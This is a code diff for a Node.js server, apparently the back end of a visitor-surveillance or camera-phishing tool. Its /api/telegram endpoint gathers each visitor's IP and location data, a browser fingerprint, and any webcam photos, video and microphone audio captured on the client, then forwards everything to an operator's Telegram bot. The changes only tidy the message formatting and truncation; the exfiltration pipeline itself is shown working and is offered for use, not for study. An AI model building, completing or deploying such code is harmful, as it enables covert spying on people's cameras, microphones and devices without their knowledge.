@@ -18,12 +18,12 @@ app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
 // ================================================================
-// BUILD A CLEAN, HUMAN-READABLE SUMMARY (NO BASE64 DATA)
+// BUILD A CLEAN SUMMARY – NO BASE64 DATA, NO LARGE STRINGS
 // ================================================================
 function buildMessage(ipData, fingerprint) {
     let msg = '📡 *New Visitor Info*\n\n';
 
-    // IP section
+    // --- IP info ---
     if (ipData) {
         msg += '*IP Info:*\n';
         msg += `IP: ${ipData.ip || 'N/A'}\n`;
@@ -41,10 +41,14 @@ function buildMessage(ipData, fingerprint) {
         msg += '\n';
     }
 
-    // Fingerprint section (no large data fields)
+    // --- Device & Browser ---
     if (fingerprint) {
         msg += '*Device & Browser:*\n';
-        msg += `User Agent: ${fingerprint.userAgent || 'N/A'}\n`;
+
+        // Limit User‑Agent to 120 characters to avoid bloat
+        const ua = (fingerprint.userAgent || '').substring(0, 120);
+        msg += `User Agent: ${ua}\n`;
+
         msg += `Platform: ${fingerprint.platform || 'N/A'}\n`;
         msg += `Language: ${fingerprint.language || 'N/A'}\n`;
         if (fingerprint.screen) {
@@ -56,21 +60,30 @@ function buildMessage(ipData, fingerprint) {
         msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
         msg += `Timezone: ${fingerprint.timezone}\n`;
 
-        // WebGL – keep it short
+        // WebGL – short
         if (fingerprint.webgl && fingerprint.webgl !== 'not supported' && fingerprint.webgl !== 'unsupported') {
-            msg += `GPU: ${fingerprint.webgl.renderer}\n`;
+            const gpu = (fingerprint.webgl.renderer || '').substring(0, 80);
+            msg += `GPU: ${gpu}\n`;
         }
 
-        // Canvas – only indicate presence, NOT the full data URL
+        // Canvas – only a yes/no indicator (no data URL)
         if (fingerprint.canvas) {
-            // Show first 30 chars of the data URL to prove it was captured
-            const preview = fingerprint.canvas.substring(0, 30) + '...';
-            msg += `Canvas fingerprint: captured (${preview})\n`;
+            msg += `Canvas fingerprint: captured\n`;
         }
+
         msg += '\n';
     }
 
     msg += `*Timestamp:* ${new Date().toISOString()}`;
+
+    // Log the length for debugging
+    console.log(`[DEBUG] Message length: ${msg.length} characters`);
+
+    // Hard cut at 3900 characters (Telegram max is 4096)
+    if (msg.length > 3900) {
+        msg = msg.substring(0, 3897) + '...';
+    }
+
     return msg;
 }
 
@@ -79,12 +92,6 @@ function buildMessage(ipData, fingerprint) {
 // ================================================================
 async function sendTextMessage(text) {
     try {
-        // Telegram limit is 4096 characters. Truncate if necessary.
-        const maxLen = 4000;
-        if (text.length > maxLen) {
-            text = text.substring(0, maxLen - 3) + '...';
-        }
-
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const res = await fetch(url, {
             method: 'POST',
@@ -154,7 +161,7 @@ async function sendAudio(base64) {
 }
 
 // ================================================================
-// MAIN ENDPOINT – matches client’s /api/telegram
+// MAIN ENDPOINT
 // ================================================================
 app.post('/api/telegram', async (req, res) => {
     try {
@@ -166,11 +173,11 @@ app.post('/api/telegram', async (req, res) => {
         console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
         console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);
 
-        // 1. Always send the text summary (clean)
+        // 1. Always send the clean text summary
         const message = buildMessage(ipData, fingerprint);
         await sendTextMessage(message);
 
-        // 2. Send media if present (from full capture)
+        // 2. Media only if present
         if (photo) await sendPhoto(photo);
         if (video) await sendVideo(video);
         if (mic) await sendAudio(mic);
